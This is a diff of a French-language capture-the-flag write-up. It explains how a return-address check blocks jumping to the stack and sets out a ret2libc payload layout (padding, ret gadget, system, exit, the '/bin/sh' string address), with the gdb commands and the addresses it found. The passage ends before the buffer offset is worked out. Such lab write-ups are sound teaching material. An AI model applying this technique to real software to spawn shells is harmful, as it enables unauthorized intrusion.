@@ -6,12 +6,15 @@ Mais apres gets() la fonction p va vérifier l'adresse de retour de la fonction 
 0x080484fb <+39>:    and    $0xb0000000,%eax
 0x08048500 <+44>:    cmp    $0xb0000000,%eax
 
-Si on fait pointer sur par exemple 0xbfffff01, on aurait comme comparaison ((0xbfffff01 & 0xb0000000) == 0xb0000000) 
+Si on fait pointer sur par exemple 0xbfffff01, on aurait comme comparaison ((0xbfffff01 & 0xb0000000) == 0xb0000000)
+```
 0xbfffff01 = 10111111 11111111 11111111 00000001
 AND
 0xb0000000 = 10110000 00000000 00000000 00000000
+
 En opération binaire 1 & 0 = 0 donc on obtient
 0xb0000000 = 10110000 00000000 00000000 00000000
+```
 
 Nous ne pouvont donc pas overwrite EIP avec une adresse commencant par 0xb, ce qui est le cas de toutes les adresses de la stack. 
 
@@ -19,13 +22,16 @@ En revanche on peut utiliser un ret2libc ce qui va nous permettre de bypass la v
 
 Un ret2libc se forme comme ceci:
 
-"notre buffer size max" + "l'adresse du return de la fonction p" + "l'adresse de la fonction system" + "l'adresse de la fonction exit ( qui sert de fonction de retour pour system )" + " notre argument pour la fonction system donc l'adresse de la string /bin/sh"
+`"notre buffer size max" + "l'adresse du return de la fonction p" + "l'adresse de la fonction system" + "l'adresse de la fonction exit ( qui sert de fonction de retour pour system )" + " notre argument pour la fonction system donc l'adresse de la string /bin/sh"`
 
 Toutes ces informations sont disponibles dans le système en dehors de l'exécutable, et avec l'Address Space Layout Randomization (ASLR) désactivé, on peut accéder à leur adresse mémoire via gdb. Il suffit de mettre un breakpoint dans le programme, le run puis d'utiliser les commandes suivantes:
 
 `print &system` --> 0xb7e6b060 (adresse de system()) 
+
 `print &exit`   --> 0xb7e5ebe0 (adresse de exit())
+
 `disass p`     --> 0x0804853e (call assembly de ret, on remarque que ça ne commence pas par 0xb)
+
 `find &system, +9999999, "/bin/sh"` --> 0xb7f8cc58 (adresse de la string "/bin/sh") 
 
 Il nous manque que l'offset afin de savoir quel taille fait notre buffer.
